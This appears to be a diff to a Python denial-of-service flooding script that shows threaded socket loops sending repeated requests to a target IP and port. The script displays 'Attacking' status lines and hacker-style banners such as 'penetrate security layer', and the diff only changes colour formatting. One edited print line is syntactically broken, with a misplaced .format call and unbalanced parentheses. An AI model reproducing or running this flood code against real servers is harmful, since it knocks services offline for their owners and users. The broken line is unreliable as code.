@@ -81,7 +81,7 @@ print("\033[96m                  >>> DD0S TCP LOADER \033[0m "),
 time.sleep(5),
 print("\033[92m                  >>> search server \033[0m "),
 time.sleep(5),
-print("\033[1m                   >>> starts connection \033[0m "),
+print("\033[1m                  >>> starts connection \033[0m "),
 time.sleep(5),
 print("\033[97m                  >>> penetrate security layer \033[0m "),
 time.sleep(5),
@@ -106,10 +106,10 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("\033[33m[+\033[33m]\033[31mAttacking {0}:{1} |\033[96mSent:::.. {2}\033[0m".format(str(ip), int(port), xx))
+            print("\033[33m[+\033[33m]\033[31mAttacking {0}:{1} |\033[96mSent:::.. {2}\033[0m").format(str(ip), int(port), xx))
         except:
             s.close()
-            print('[+] Server Down.')
+            print("\033[92m[\033[33m+\033[93m] \033[96mServer Down.\033[0m")
 
 for x in range(thread):
     thred = threading.Thread(target=start)
